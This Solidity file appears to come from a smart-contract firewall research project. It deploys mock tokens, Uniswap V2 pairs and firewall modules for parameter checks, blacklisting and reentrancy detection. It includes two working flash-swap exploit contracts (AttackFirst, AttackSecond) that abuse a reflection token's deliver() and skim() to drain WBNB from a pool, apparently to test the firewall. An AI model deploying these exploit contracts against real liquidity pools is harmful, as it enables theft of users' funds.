// SPDX-License-Identifier: MIT
pragma solidity =0.8.26;

import {console} from "forge-std/Script.sol";
import {USDC, WBNB} from "./ERC20.sol";
import {CoinToken} from "./vulns/coinToken.sol";
import {UniswapV2Factory} from "./UniswapV2Factory.sol";
import {
    IUniswapV2Callee,
    IUniswapV2Callee,
    IUniswapV2Pair,
    IERC20,
    IUniswapV2Factory,
    IProtectProject
} from "./interfaces.sol";
import {FireWallRegistryV2} from "./Implemention/RegistryV2.sol";
import {FireWallRouterV2} from "./Implemention/RouterV2.sol";
import {AuthModule} from "./Implemention/AuthenticationModule.sol";
import {ParamCheckModule} from "./Implemention/ParamCheckModule.sol";
import {ProxyForRegistry} from "./proxy/proxyForRegistry.sol";
import {ProxyForRouter} from "./proxy/proxyForRouter.sol";
import {ReentrancyDetectModule} from "../src/Implemention/ReentrancyDetectModule.sol";

contract DeployToken {
    USDC public usdc;
    WBNB public wbnb;
    CoinToken public bevo;
    address public usdc_wbnb;
    address public wbnb_bevo;
    bytes32 _salt = keccak256(abi.encodePacked("1"));

    constructor() {
        usdc = new USDC{salt: _salt}();
        wbnb = new WBNB{salt: _salt}();
        bevo = new CoinToken{salt: _salt}();
    }

    function setLiquidity(UniswapV2Factory factory) public {
        usdc_wbnb = factory.getPair(address(usdc), address(wbnb));
        wbnb_bevo = factory.getPair(address(wbnb), address(bevo));

        bevo.setr(wbnb_bevo);

        usdc.transfer(usdc_wbnb, 2419698099143706937273612);

        wbnb.transfer(usdc_wbnb, 7859611160946076447840);
        wbnb.transfer(wbnb_bevo, 145721197780523651391);

        IUniswapV2Pair(usdc_wbnb).sync();

        IUniswapV2Pair(wbnb_bevo).sync();
    }
}

contract DeployPair {
    UniswapV2Factory public factory;
    USDC public usdc;
    WBNB public wbnb;
    CoinToken public bevo;
    address public usdc_wbnb;
    address public wbnb_bevo;

    constructor(DeployToken tokens) {
        factory = new UniswapV2Factory(msg.sender);

        usdc_wbnb = factory.createPair(address(tokens.usdc()), address(tokens.wbnb()));
        wbnb_bevo = factory.createPair(address(tokens.wbnb()), address(tokens.bevo()));
    }
}

contract FireWallDeployer {
    FireWallRegistryV2 public registry;
    ProxyForRegistry public proxy_registry;
    FireWallRouterV2 public router;
    ProxyForRouter public proxy_router;
    ParamCheckModule public param_detect;
    AuthModule public auth_detect;
    ReentrancyDetectModule public reen_detect;

    constructor() {
        // 部署registry
        registry = new FireWallRegistryV2();
        // 部署registry proxy
        bytes memory proxy_registry_init_data = abi.encodeWithSignature("initialize(address)", msg.sender);
        proxy_registry = new ProxyForRegistry(address(registry), msg.sender, proxy_registry_init_data);
        // 部署router
        router = new FireWallRouterV2();
        // 部署router proxy
        bytes memory proxy_router_init_data =
            abi.encodeWithSignature("initialize(address,address)", address(proxy_registry), msg.sender);
        proxy_router = new ProxyForRouter(address(router), msg.sender, proxy_router_init_data);
        // 部署参数拦截模块
        param_detect = new ParamCheckModule(address(proxy_router), address(proxy_registry));
        proxy_registry.CallOn(
            abi.encodeWithSignature(
                "addModule(address,address,string,bool)", param_detect, msg.sender, "param detect", true
            )
        );
        // 部署黑名单模块
        auth_detect = new AuthModule(address(proxy_router), address(proxy_registry));
        proxy_registry.CallOn(
            abi.encodeWithSignature(
                "addModule(address,address,string,bool)", auth_detect, msg.sender, "auth detect", true
            )
        );

        // 部署重入模块
        reen_detect = new ReentrancyDetectModule(address(proxy_router), address(proxy_registry));
        proxy_registry.CallOn(
            abi.encodeWithSignature(
                "addModule(address,address,string,bool)", reen_detect, msg.sender, "reen detect", true
            )
        );
    }

    function setProject(address project_addr, bytes4 sig, string[] memory params, address[] memory modules) external {
        IProtectProject(project_addr).set_router(address(proxy_router));
        // 为project_addrregister
        (bool suc,) = address(proxy_registry).call(
            abi.encodeWithSignature(
                "register(address,address,bytes4,string[],address[])", project_addr, msg.sender, sig, params, modules
            )
        );
        require(suc, "register error");
    }

    function batch_setblack(address project, address[] memory blacklist) external {
        address module_address = address(auth_detect);
        bytes memory batch_set_data = abi.encode(project, blacklist);
        bytes memory change_mode_data = abi.encode(project, false, true);


        bytes memory call_data2 = abi.encodeWithSignature("changeMode(address,bytes)", module_address, change_mode_data);
        proxy_registry.CallOn(call_data2);

        bytes memory call_data = abi.encodeWithSignature("batchSetInfo(address,bytes)", module_address, batch_set_data);
        proxy_registry.CallOn(call_data);

    }
}

contract AttackFirst is IUniswapV2Callee {
    address usdc;
    address wbnb;
    address bevo;
    IUniswapV2Pair usdc_wbnb;
    IUniswapV2Pair wbnb_bevo;
    uint256 public flag = 0;

    constructor(UniswapV2Factory factory, DeployToken tokens) {
        usdc = address(tokens.usdc());
        wbnb = address(tokens.wbnb());
        bevo = address(tokens.bevo());
        usdc_wbnb = IUniswapV2Pair(factory.getPair(address(usdc), address(wbnb)));
        wbnb_bevo = IUniswapV2Pair(factory.getPair(address(wbnb), address(bevo)));
    }

    function attack() public {
        if (usdc < wbnb) {
            // token0为usdc，则借出token1
            usdc_wbnb.swap(0, 192500000000000000000, address(this), new bytes(1));
        } else {
            // token0为wbnb，则借出token0
            usdc_wbnb.swap(192500000000000000000, 0, address(this), new bytes(1));
        }
        console.log("after attack,attacker wbnb balance is %s", IERC20(wbnb).balanceOf(address(this)));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external override {
        // 在兑换代币前先转账WBNB
        WBNB(wbnb).transfer(address(wbnb_bevo), 192500000000000000000);
        (uint256 balance0, uint256 balance1, uint32 timestamp) = wbnb_bevo.getReserves();
        if (wbnb < bevo) {
            // token0为wbnb
            // 换出bevo
            wbnb_bevo.swap(0, 3028267986646483923, address(this), "");
            CoinToken(bevo).deliver(CoinToken(bevo).balanceOf(address(this)));
            wbnb_bevo.skim(address(this));
            CoinToken(bevo).deliver(CoinToken(bevo).balanceOf(address(this)));
            // 将bevo换成wbnb
            wbnb_bevo.swap(337 ether, 0, address(this), "");
        } else {
            // token1为wbnb
            wbnb_bevo.swap(3028267986646483923, 0, address(this), "");
            CoinToken(bevo).deliver(CoinToken(bevo).balanceOf(address(this)));
            wbnb_bevo.skim(address(this));
            CoinToken(bevo).deliver(CoinToken(bevo).balanceOf(address(this)));
            // 将bevo换成wbnb
            wbnb_bevo.swap(0, 337 ether, address(this), "");
        }

        WBNB(wbnb).transfer(address(usdc_wbnb), 195 ether);
    }
}

contract AttackSecond is IUniswapV2Callee {
    address usdc;
    address wbnb;
    address bevo;
    IUniswapV2Pair usdc_wbnb;
    IUniswapV2Pair wbnb_bevo;

    constructor(UniswapV2Factory factory, DeployToken tokens) {
        usdc = address(tokens.usdc());
        wbnb = address(tokens.wbnb());
        bevo = address(tokens.bevo());

        usdc_wbnb = IUniswapV2Pair(factory.getPair(address(usdc), address(wbnb)));
        wbnb_bevo = IUniswapV2Pair(factory.getPair(address(wbnb), address(bevo)));
    }

    function attack() public {
        if (usdc < wbnb) {
            // token0为usdc，则借出token1
            usdc_wbnb.swap(0, 0.05 ether, address(this), new bytes(1));
        } else {
            // token0为wbnb，则借出token0
            usdc_wbnb.swap(0.05 ether, 0, address(this), new bytes(1));
        }
        console.log("after attack,attacker wbnb balance is %s", IERC20(wbnb).balanceOf(address(this)));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external override {
        // 在兑换代币前先转账WBNB
        WBNB(wbnb).transfer(address(wbnb_bevo), 0.05 ether);

        if (wbnb < bevo) {
            // token0为wbnb
            // 换出bevo
            wbnb_bevo.swap(0, 1.2 ether, address(this), "");
            CoinToken(bevo).deliver(CoinToken(bevo).balanceOf(address(this)));
            wbnb_bevo.skim(address(this));
            CoinToken(bevo).deliver(CoinToken(bevo).balanceOf(address(this)) / 100);
            wbnb_bevo.swap(0.11 ether, 0, address(this), "");
        } else {
            // token1为wbnb
            wbnb_bevo.swap(1.2 ether, 0, address(this), "");
            CoinToken(bevo).deliver(CoinToken(bevo).balanceOf(address(this)));
            wbnb_bevo.skim(address(this));
            CoinToken(bevo).deliver(CoinToken(bevo).balanceOf(address(this)) / 100);
            wbnb_bevo.swap(0, 0.11 ether, address(this), "");
        }

        WBNB(wbnb).transfer(address(usdc_wbnb), 0.06 ether);
    }
}
